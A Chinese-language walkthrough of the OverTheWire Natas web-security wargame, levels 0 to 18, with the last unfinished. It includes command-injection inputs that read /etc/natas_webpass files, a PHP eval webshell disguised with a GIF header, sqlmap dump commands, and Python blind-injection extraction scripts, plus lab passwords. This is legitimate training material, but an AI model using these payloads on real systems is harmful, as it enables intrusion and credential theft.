# Natas

:::info

Natas 教授服务器端网页安全的基础知识。

Natas 的每个关卡都有自己独立的网站，位于 `http://natasX.natas.labs.overthewire.org`，其中 X 是关卡编号。这里没有 SSH 登录功能。要访问某个关卡，你需要输入该关卡的用户名（例如，第 0 关的用户名是 natas0）和对应的密码。

每个关卡都可以访问下一关的密码。你的任务是以某种方式获取下一关的密码并完成升级。所有密码都存储在 /etc/natas_webpass/ 中。例如，natas5 的密码存储在文件 `/etc/natas_webpass/natas5` 中，该文件只有 natas4 和 natas5 有读取权限。

:::

## Level 0

> Username: natas0
> Password: natas0
> URL:      `http://natas0.natas.labs.overthewire.org`

直接登录即可

## Level 0 → Level 1

在 Level 0 页面的 HTML 源码中

![img](img/image_20250109-210948.png)

```html
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```

## Level 1 → Level 2

依然在网页的 HTML 源码中

![img](img/image_20250114-211450.png)

```html
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```

## Level 2 → Level 3

与之前的请求相比，多了一个资源请求

![img](img/image_20250122-212200.png)

尝试对路径进行探测，发现 `http://natas2.natas.labs.overthewire.org/files/`

![img](img/image_20250122-212223.png)

```plaintext title="users.txt"
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Level 3 → Level 4

在页面的源码中，存在有这么一行注释

```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```

结合 Google 来思考，可以想到约束自动化爬虫的 `robots.txt` 文件

```plaintext title="robots.txt"
User-agent: *
Disallow: /s3cr3t/
```

最后得到

```plaintext title="http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

## Level 4 → Level 5

![img](img/image_20250128-212849.png)

根据页面信息，很明显就能想到是更改 Header 字段

```plaintext
GET / HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Accept-Language: zh-CN,zh;q=0.9
Referer: http://natas5.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![img](img/image_20250137-213727.png)

```plaintext
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

## Level 5 → Level 6

![img](img/image_20250139-213909.png)

根据页面提示，猜测可能是 Cookie 的问题

![img](img/image_20250139-213948.png)

将 `loggedin` 的值改为 1 之后

![img](img/image_20250140-214014.png)

```plaintext
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

## Level 6 → Level 7

![img](img/image_20250141-214119.png)

提供了源码

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

那么可以直接读取凭据信息

```php title="http://natas6.natas.labs.overthewire.org/includes/secret.inc"
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

![img](img/image_20250143-214328.png)

```plaintext
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

## Level 7 → Level 8

![img](img/image_20250146-214629.png)

在 HTML 源码中得到

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

尝试与界面的链接进行交互

![img](img/image_20250147-214747.png)

尝试是否有路劲穿越的可能性

![img](img/image_20250149-214931.png)

那么直接穿越读取即可

![img](img/image_20250150-215007.png)

```plaintext
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

## Level 8 → Level 9

依然是提供了一份 PHP 源码

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

将 `encodedSecret` 进行解码

![img](img/image_20250152-215254.png)

```plaintext
oubWYf2kBq
```

![img](img/image_20250153-215314.png)

```plaintext
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

## Level 9 → Level 10

看看源码

```php
?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

很明显的命令拼接漏洞，尝试进行利用

```plaintext
;whoami;exit
```

得到

![img](img/image_20250159-215915.png)

那直接读取即可

```plaintext
; cat /etc/natas_webpass/natas10 ;exit
```

![img](img/image_20250100-220022.png)

```plaintext
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Level 10 → Level 11

![img](img/image_20250103-220313.png)

看看源码

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

直接过就行

```plaintext
. /etc/natas_webpass/natas11
```

![img](img/image_20250105-220537.png)

```plaintext
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

## Level 11 → Level 12

看看源码

```php
<?

$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

很明显，首先需要对加密算法中的 xor 部分进行解密

使用已知值 `#ffffff` 的加密后结果进行解密

![img](img/image_20250118-221839.png)

```php
<?php

function xor_encrypt($in, $key)
{
    // $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$defaultdata = json_encode(array("showpassword" => "no", "bgcolor" => "#ffffff"));
$defaultdata_encrypt = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D";

$key = xor_encrypt($defaultdata, base64_decode($defaultdata_encrypt));
echo $key;
```

得到

```plaintext
eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

根据 xor 的计算逻辑来看，实际的 key 应该为 `eDWo`

```php
<?php

function xor_encrypt($in, $key)
{
    // $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$key = "eDWo";
$newString = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$result = xor_encrypt($newString, $key);

echo base64_encode($result);
```

得到的结果填入 Cookie 即可

![img](img/image_20250126-102638.png)

```plaintext
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

## Level 12 → Level 13

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

很明显的文件上传，并且文件名可控

```php
<?php @eval($_POST['shell']) ?>
```

![img](img/image_20250134-103452.png)

上传 webshell 以后就可以进行交互

![img](img/image_20250137-103708.png)

```plaintext
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

## Level 13 → Level 14

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

核心拦截逻辑位于 `exif_imagetype` 函数，是基于文件的 Magic Number 进行判断的，那么可以套用一个图片文件的 Magic Number 进行绕过

```plaintext
GIF89a<?php @eval($_POST['shell']) ?>
```

![img](img/image_20250156-115624.png)

然后直接操作 webshell 即可

![img](img/image_20250111-121110.png)

```plaintext
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

## Level 14 → Level 15

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

直接使用 slqmap 进行自动化测试

![img](img/image_20250114-121432.png)

将原始请求传递给 sqlmap 进行利用

![img](img/image_20250116-121610.png)

![img](img/image_20250120-122011.png)

那剩下的就简单了

```shell
sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --batch --dbs
```

![img](img/image_20250123-122339.png)

快进到数据提取

```shell
sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --batch -D natas14 -T users --dump

Database: natas14
Table: users
[5 entries]
+----------------------------------+--------------------------------------+
| password                         | username                             |
+----------------------------------+--------------------------------------+
| Dl2FB9O9op                       | bob                                  |
| ikWGV9zc1i                       | charlie                              |
| keep up the good work            | you obviously know how to use sqlmap |
| PnRTQEtfkd                       | alice                                |
| SdqIqBsFcz3yotlNYErZSZwblkm0lrvx | natas15                              |
+----------------------------------+--------------------------------------+
```

## Level 15 → Level 16

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

尝试使用 sqlmap 进行自动化探测，经过测试，需要使用 `--level=3` 参数才可实现

```shell
sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --level=3
```

![img](img/image_20250156-145652.png)

然后直接自动化利用就可以

![img](img/image_20250129-152949.png)

```shell
sqlmap -r sqlmap.txt --dbms=mysql --level=3 --batch -D natas15 -T users --dump

Database: natas15
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 6P151OntQe                       | bob      |
| HLwuGKts2w                       | charlie  |
| hPkjKYviLQctEW33QmuXL6eDVfMW4sGo | natas16  |
| hROtsfM734                       | alice    |
+----------------------------------+----------+
```

## Level 16 → Level 17

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

但是没有过滤掉 `$()` 表达式，至少可以无回显盲注

由于源码中的 `grep` 带有 `-i` 参数，会影响大小写判断，所以可以考虑自己组装一个盲注

考虑采用 `Africans` 单词作为基底，在其前端加上 `$(grep)` 盲注表达式，会出现两种情况

- 如果 `$(grep 123 /etc/natas_webpass/natas16)Africans` == `Africans` 成立，则有回显，那么说明 `123` 不在 `/etc/natas_webpass/natas16` 中
- 如果 `$(grep 123 /etc/natas_webpass/natas16)Africans` == `Africans` 不成立，则没有回显，那么说明 `123` 在 `/etc/natas_webpass/natas16` 中

可以先基于此思路，将`/etc/natas_webpass/natas16`出现的字符集进行提取

```python
import string
import requests
from requests.auth import HTTPBasicAuth

dics = string.ascii_letters + string.digits

result = ""

for i in dics:
    req = requests.post(
        f"http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep {i} /etc/natas_webpass/natas17)Africans&submit=Search",
        auth=HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"),
    )

    res = req.text.split("Output:")[1].split("<div")[0].strip().split("\n")[1:-1]
    if res == []:
        result += i
        print(result)
# bhjkoqsvwCEFHJLNOT05789
```

得到`/etc/natas_webpass/natas16` 中出现的字符集为

```plaintext
abdglnpqrwxyzABCFHIJNORSTUZ0125789
```

然后接下来最困难的一步，就是确认中间已知部分，至少2字符长度，这样才可以建立逐字符盲注

下面这个脚本跑一部分即可，只需要一个看得顺眼的就行

```python
import itertools
import requests
from requests.auth import HTTPBasicAuth

dics = "bhjkoqsvwCEFHJLNOT05789"
combinations = ["".join(pair) for pair in itertools.product(dics, repeat=2)]
result = []

for i in combinations:
    print(i)
    req = requests.post(
        f"http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep {i} /etc/natas_webpass/natas17)Africans&submit=Search",
        auth=HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"),
    )

    res = req.text.split("Output:")[1].split("<div")[0].strip().split("\n")[1:-1]
    if res == []:
        result.append(i)
        print(result)
# bo
```

已经确定`bo`位于`/etc/natas_webpass/natas16` 之中之后，先向后进行扫描

```python
import requests
from requests.auth import HTTPBasicAuth

dics = "bhjkoqsvwCEFHJLNOT05789"
# combinations = ["".join(pair) for pair in itertools.product(dics, repeat=2)]
result = "bo"

while True:
    end_flag = 0
    for i in dics:
        print(i)
        req = requests.post(
            f"http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep {result+i} /etc/natas_webpass/natas17)Africans&submit=Search",
            auth=HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"),
        )

        res = req.text.split("Output:")[1].split("<div")[0].strip().split("\n")[1:-1]
        if res == []:
            result += i
            print(result)
            break
        else:
            end_flag += 1
    if end_flag == len(dics):
        break

print(result)
# bo7LFNb8vwhHb9s75hokh5TF0OC
```

然后稍加修改，往前扫描即可

```python
import requests
from requests.auth import HTTPBasicAuth

dics = "bhjkoqsvwCEFHJLNOT05789"
# combinations = ["".join(pair) for pair in itertools.product(dics, repeat=2)]
result = "bo7LFNb8vwhHb9s75hokh5TF0OC"

while True:
    end_flag = 0
    for i in dics:
        print(i)
        req = requests.post(
            f"http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep {i+result} /etc/natas_webpass/natas17)Africans&submit=Search",
            auth=HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"),
        )

        res = req.text.split("Output:")[1].split("<div")[0].strip().split("\n")[1:-1]
        if res == []:
            result = i + result
            print(result)
            break
        else:
            end_flag += 1
    if end_flag == len(dics):
        break

print(result)
# EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

## Level 17 → Level 18

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

一眼啥都没有，就是时间盲注或者报错盲注，交给sqlmap

```shell
sqlmap --proxy=http://127.0.0.1:7890 -r sqlmap.txt --dbms=mysql --level=3 --time-sec 2 --batch -D natas17 -T users
```

![img](img/image_20250130-203047.png)

即可得到结果

```shell
sqlmap --proxy=http://127.0.0.1:7890 -r sqlmap.txt --dbms=mysql --level=3 --time-sec 2 --batch -D natas17 -T users --dump

ser3
Database: natas17
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd | user1    |
| 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ | natas18  |
| MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 | user2    |
| VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD | user3    |
+----------------------------------+----------+
```

## Level 18 → Level 19

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

TODO 暂时搁置
